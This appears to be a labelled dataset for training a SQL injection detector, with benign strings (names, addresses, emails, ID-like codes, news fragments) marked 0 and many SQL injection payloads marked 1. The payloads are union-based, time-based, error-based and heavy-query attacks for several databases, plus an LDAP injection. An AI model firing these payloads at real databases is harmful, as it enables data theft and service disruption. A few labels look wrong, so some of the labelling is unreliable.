Query,Label
"1'  )  )   )  or 2367 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
1 )  as oknr where 3228 = 3228,1
alvean,0
8588111212393329,0
1%' )  or 4240 =  ( select 4240 from pg_sleep ( 5  )  )  --,1
8750399717203336,0
 3: 00 p,0
1'  )  )   )  or  ( select * from  ( select ( sleep ( 5  )  )   ) sddo ) #,1
1' and 6240 =  ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' )  and 'pnpx' = 'pnpx,1
drabek,0
" However , given ease behaviour recorded , probably long understand tails sometimes go one way , sometimes ",0
osornillo,0
"1"" )  where 8254 = 8254 and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1
marines,0
4658,0
" Halloween 2013: By Numbers When I little , Halloween magical ",0
"1'+ ( select ounb where 4653 = 4653 or exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 6270 = 6270,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   ) +'",1
30649909v,0
2546840770409858,0
1'  )  )   )  rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end  )  )   and   (  (   ( 'ywbs' = 'ywbs,1
28 %,1
seaman@salaparis.ws,0
1'  )  )   as jtmf where 3937 = 3937,1
hermon,0
rasquetear,0
6052575458903968,0
ca61u13ia-0,0
cyros,0
san ildefonso,0
clodomiro,0
kent,0
1'+ ( select 'mdiu' where 4443 = 4443,1
36830,0
8489461843085797,0
bailina quijad,0
"1 where 6369 = 6369 procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50  )  )    )  )   ) ,1 ) --",1
poyales del hoyo,0
"1%""  )  )   )  or 2367 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
 What found horrifying ,0
select  ( case when  ( 2830 = 7046 )  then 2830 else cast ( 1 as int ) / ( select 0 from dual )  end )  from dual--,1
" select * from users where id = 1 or ""; ) "" = 1 or 1 = 1 -- 1",1
"1""  )  )   )  and exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8190 = 8190,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and   (  (   ( ""sdvu"" like ""sdvu",1
"-5396'|| ( select 'fjhd' from dual where 4019 = 4019 union all select 4019,4019,4019,4019#",1
vial,0
2362165176324303,0
8510133826812144,0
"1"" and 3707 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) ",1
"1"" procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1 )  and ""acbq"" like ""acbq",1
1  )  )   as dqfl where 7527 = 7527,1
"select * from generate_series ( 4465,4465,case when  ( 4465 = 6232 )  then 1 else 0 end )  limit 1--",1
"select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and  ( ""%"" = """,1
25136,0
"1""  )  )   as ihfw where 3949 = 3949 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1
c3er2e4ue15,0
"1"" )  where 6138 = 6138 and 8594 =  ( select 8594 from pg_sleep ( 5  )  )  --",1
1'  )  )   as dago where 9788 = 9788,1
lian,0
"'; INSERT INTO users VALUES('hacker','pass')--",1
tossa de mar,0
13189,0
arroc9era,0
50678,0
aguilar de la frontera,0
net.valdez@salaparis.gt,0
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 )  from dual--",1
"-7107""  )  )   )  order by 1#",1
9834147083222005,0
riordan,0
altares pellizza,0
5128322398230292,0
monimiceo,0
mu-cheng,0
"-6680%""  )  )   union all select 3719,3719,3719,3719,3719,3719,3719,3719,3719--",1
"-8707' )  union all select 5609,5609,5609--",1
06660,0
-3100' )  or 4144 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4144 = 4144 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and  ( 'etuj' like 'etuj,1
roth,0
"-6662""  )  )   union all select 6755--",1
"1%""  )  )   )  or 9643 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and   (  (   ( ""%"" = """,1
xanto,0
10691,0
" For 14 hours , doctors battled save life victim , ultimately vain ",0
chavez,0
espndola pavajeau,0
"1"" )  and 2006 = 2006",1
"1'  )  )   and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and   (  (  'novq' = 'novq",1
7590,0
"1,iif ( 1440 = 4612,1,1/0 ) ",1
"1%' and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 6237 = 6237,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )  and '%' = '",1
8781173513237509,0
1%' or  ( select * from  ( select ( sleep ( 5  )  )   ) ydpu )  and '%' = ',1
"1%"" )  and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1
1 and 3715 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   ) ,1
"moraira 185,",0
' ',1
walberto,0
"1%""  )  )   )  and 8635 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1
45800,0
" select * from users where id = 1 or "" ( #"" or 1 = 1 -- 1",1
1  )  )   as gxvp where 3865 = 3865,1
bernaus,0
 The Hamburg Towers basketball project declining make application possible stand-in place ,0
"-7329""  )  )   )  or 5903 =  ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' )  and   (  (   ( ""borw"" like ""borw",1
"1  )  )   as wezj where 2869 = 2869 and  ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9067 = 9067,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a ) --",1
"1""  )  )   as nbdc where 4444 = 4444 union all select null,null--",1
pozuelo de calatrava,0
" I stand humanity, though I would make kind, I would make true",0
guntar,0
grelck,0
58157080q,0
"1%'  )  )   )  or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c  )  )  #",1
sheffield@ringringrent.my,0
"-1184""  )  )   )  union all select 1482--",1
drissel,0
6402952155575779,0
"-2821""  )  )   )  union all select 3920,3920,3920,3920,3920,3920,3920#",1
"""  )  )   or pg_sleep ( __TIME__ ) --",1
" But connecting Internet surf , exchange emails , text download data still prohibited 10,000 feet , agency said ",0
17115248m,0
-1662 where 1119 = 1119 or  ( 8459 = 8459 ) *4906--,1
05659,0
"1"" )  or exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 6270 = 6270,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and  ( ""oyfk"" = ""oyfk",1
1'|| ( select 'blvu' from dual where 9813 = 9813,1
tordelrbano,0
 That troubles ,0
"-7889""  )  )   as oayf where 1765 = 1765 or 8571 = 8571--",1
" To make people laugh , reduce pain , &apos;s I &apos;m ",0
1 )  as cinw where 3732 = 3732 and 8594 =  ( select 8594 from pg_sleep ( 5  )  )  --,1
2657051536857190,0
4233835783562631,0
" select * from users where id = 1 union select @<@.,version (  )  -- 1",1
juornneau@buscadordevideos.cr,0
7961872329809538,0
" But devices testing appeal highway planners &apos;t use GPS deliver limited amount information , uploaded periodically modem ",0
92173990h,0
"1%' or 2367 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
if ( 6554 = 1534 )  select 6554 else drop function buqb--,1
1  )  )   as wwys where 9248 = 9248,1
23l8noi7e,0
" Konstanz: Road block following accident Schänzle roundabout According police , accident occurred 51-year-old driver Swiss Seat Ibiza travelling town left lane two-lane Reichenaustrasse ",0
pinilla de los barruecos,0
 Mayor Erich Maier responded postal service communicated Lampertheim ,0
stastny,0
"1"" and 1668 = 8288",1
37244804f,0
humphery@natravea.uz,0
alpanseque,0
"-3009'+ ( select 'gqbo' where 6915 = 6915 union all select 6915,6915--",1
bylina,0
1' and 2006 = 2006,1
"1""  )  )   and 3707 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )  and   (  (  ""uglh"" like ""uglh",1
shafiq,0
"-1302""  )  )   as rshr where 2800 = 2800 or 4747 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4747 = 4747 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   ) --",1
"1""  )  )   and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 )  and   (  (  ""qqky"" like ""qqky",1
plebs cadevall,0
"1' )  where 1363 = 1363 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) --",1
"1 )  as tjwa where 1173 = 1173 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 1297 = 1297,1  )  )   ) ,0x717a767a71  )  )  --",1
"1  )  )   as khvx where 7533 = 7533 union all select null,null,null,null,null,null,null,null--",1
1' )  where 8142 = 8142 waitfor delay '0:0:5'--,1
aida 184,0
c/ florida 180 1?b,0
repraz torrubiano,0
orr,0
1442431887503330,0
" At inauguration Supreme Constitutional Court , Morsi also became Arab world &apos;s first freely elected Islamist president Egypt &apos;s fifth head state since overthrow monarchy 60 years ago ",0
"1"" )  as kfvy where 7305 = 7305 or sleep ( 5 ) --",1
" CDC issues children &apos;s allergy guidelines schools On Wednesday , Centers Disease Control Prevention released set guidelines manage children &apos;s food allergies school ",0
"c/ angel ochotorena, 132, 10?b",0
17486,0
89416530m,0
"1"" )  as zovk where 4591 = 4591 or 4240 =  ( select 4240 from pg_sleep ( 5  )  )  --",1
patanera,0
lenihan.asanachinda@hojainformativas.cf,0
20540,0
aurie,0
"-8414%"" )  union all select 2795#",1
"-2314%'  )  )   union all select 4612,4612--",1
educativo,0
"jose maria mortes lerma, 151 11-d",0
saia,0
miranda de arga,0
"1' )  or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 1045 = 1045,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x )  and  ( 'cogk' = 'cogk",1
"1"" )  or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and  ( ""kzcd"" = ""kzcd",1
" At time , speaker court said could proven men actually involved bloody feud ",0
05631,0
"c/ empecinado 134, 3-b",0
guillem paip,0
sibila,0
"1  )  )   )  union all select null,null,null,null,null#",1
8582534834926521,0
06260,0
" &quot; I salute fortitude courage &apos;ve demonstrated fulfilling challenging mission ever undertaken organization , &quot; watchdog &apos;s director-general , Ahmet Uzumcu , said comments released OPCW ",0
"1'  )  )   )  or 9643 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and   (  (   ( 'phdn' like 'phdn",1
43895,0
07460,0
 The firefighters amazing ,0
UPDATE users SET last_login = NOW() WHERE id = 5,1
"1'+ ( select 'opqr' where 2442 = 2442 or 1022 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
"-4407"" )  where 2055 = 2055 or elt ( 9714 = 5040,5040 ) --",1
edlund@cementoscalibra.yu,0
1' and 7533 = 7533 and 'clqy' like 'clqy,1
altorricn,0
"1 where 5081 = 5081 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) --",1
calle tresmall 154,0
"-5863"" or 4144 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4144 = 4144 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and ""gkvy"" = ""gkvy",1
2ecur0i8a,0
yoe,0
1386580487506748,0
"9 billion spent , according NRF ",0
5793462659286586,0
desplans,0
6460,0
"1' )  as nvqk where 3917 = 3917 or 1022 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
"1' or 1022 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
"1""  )  )   and 8329 = 5584#",1
" In book , interior decorator presents 17 housing models independent living old age ",0
"1, ( case when 6620 = 3092 then 1 else null end ) ",1
"1%"" rlike  ( select * from  ( select ( sleep ( 5  )  )   ) vwyq ) #",1
 end and 'wdce' = 'wdce,1
"calle bernardino valle y gracia, 177",0
"1'  )  )   )  and 8407 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and   (  (   ( 'pufu' like 'pufu",1
 ( select  ( case when  ( 9337 = 9337 )  then waitfor delay '0:0:5' else 9337* ( select 9337 from master..sysdatabases )  end  )  )  ,1
"plaa creu gran, 65",0
"1' procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50  )  )    )  )   ) ,1 )  and 'gbpg' = 'gbpg",1
"1"" )  as ybkp where 7788 = 7788 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745  )  )  --",1
"1%' or 5356 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
klotz,0
"1%""  )  )   )  or 8421 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and   (  (   ( ""%"" = """,1
gorostidi ponce,0
"1"" where 1831 = 1831 and  ( select * from  ( select ( sleep ( 5  )  )   ) gcrr ) #",1
emmersto,0
shalom,0
zorrilla guevara,0
-8095' )  or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )  ,1
sarcey-fendel@gesmahernan.de,0
6531431919171426,0
"-4756%'  )  )   union all select 7824,7824,7824,7824,7824,7824,7824,7824#",1
06145837f,0
01206,0
janssen,0
 Passengers supposed turn devices plane descends land restart plane ground ,0
sant juli del llor i bonmat,0
" The committee considers reconstruction &quot; Vor Heubach &quot; &apos; Vor Kuhbach &quot; railway crossings , crossing agreements already reached Deutsche Bahn , unproblematic ",0
9490117587717675,0
"1'+ ( select 'zkuf' where 3591 = 3591 or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null  )  )  +'",1
"1"" where 4597 = 4597 rlike sleep ( 5 ) --",1
"1'  )  )   )  procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50  )  )    )  )   ) ,1 )  and   (  (   ( 'aqdj' = 'aqdj",1
28749,0
"-5667%'  )  )   or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 5023 = 5023 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and   (  (  '%' = '",1
zo,0
"-8734%"" )  or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   and  ( ""%"" = """,1
17740,0
82497790x,0
 During course day one thing became particularly clear: scepticism towards new system reluctantly yet visibly giving way confidence ,0
"1  )  )   as nlzg where 1482 = 1482 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1 ) --",1
panell portaneri,0
"1  )  )   as wmxa where 6485 = 6485 and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1
"1  )  )   union all select null,null,null,null--",1
-5352%'  )  )   )  or 2724 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 2724 = 2724 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and   (  (   ( '%' = ',1
reinaldo,0
84443986s,0
48210,0
-8463  )  )   )  or 4861 = 9834#,1
colobran rebull,0
berval.kazem@provider.com.sj,0
" Among issues , topics discussed included direct democracy , bribery MPs Federal Police ",0
"carrer carrasca 19, 4-c",0
1951,0
tolomei vil,0
 Most new airliners planes modified passengers use Wifi higher altitudes expected meet criteria ,0
1' )  and  ( 3020 = 3020 ) *6703,1
"-3975' )  or make_set ( 1943 = 3499,3499 )  and  ( 'dawb' = 'dawb",1
faci59ado,0
pesillo,0
" &quot; With hundreds thousands receiving cancellation notices providers , Republicans slammed president recent days misleading American public ",0
"acebrn, el",0
tafler@lamarsrl.ck,0
12310,0
jalaie,0
tenesaca chaves,0
"1  )  )   union all select null,null,null,null,null,null--",1
borbn bascomta,0
 -- &password = ,1
belkis,0
9738066615220073,0
"1 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  # hkrp",1
"-4983%"" )  or 4747 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4747 = 4747 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and  ( ""%"" = """,1
villazn peters,0
guy,0
* ( | ( mail = *  )  )  ,1
 The majority people put back minds long possible ,0
" select * from users where id = 1 union select 1`\`,version (  )  -- 1",1
"select count ( * )  from generate_series ( 1,5000000 )  and   (  (   ( '%' = '",1
"calle de las abejorreras 29, 4a",0
01449036j,0
cnudde.mccauley@waikilu.so,0
16812,0
7704,0
"-8893%' )  union all select 1254,1254--",1
"select sleep ( 5 )  and  ( ""%"" = """,1
kootenay.ramos@mayoriasilenciosa.bi,0
" The tour begins somewhat unspectacular fashion: &quot; We begin underground car park , &quot; says Schulze ",0
pasealekua manuel lardizabal 105 6d,0
"1 )  as biup where 1414 = 1414 union all select null,null,null,null,null,null,null,null#",1
" select * from users where id = 1 or "".{"" or 1 = 1 -- 1",1
descolocado,0
1 )  or  ( select * from  ( select ( sleep ( 5  )  )   ) ydpu )  and  ( 7079 = 7079,1
barbieri guamanzara,0
014e35,0
-6757'  )  )   )  or 4524 = 3696,1
75994493d,0
mastroma,0
"1""  )  )   as femc where 1313 = 1313 and 4595 = 4595#",1
pena-fer,0
1 billion ,0
"1' and 5556 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )  and 'hhbh' = 'hhbh",1
"-6292 )  union all select 7499,7499,7499,7499,7499,7499,7499--",1
 Clive Palmer claims PM Tony Abbott conflict interest parental leave scheme Billionaire MP Clive Palmer says Prime Minister Tony Abbott conflict interest parental leave scheme daughters might get pregnant benefit ,0
balulde,0
-9975 where 9760 = 9760 order by 1--,1
"1 )  where 5232 = 5232 union all select null,null,null#",1
69299598t,0
"-3437 )  union all select 7774,7774,7774--",1
"1"" and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1
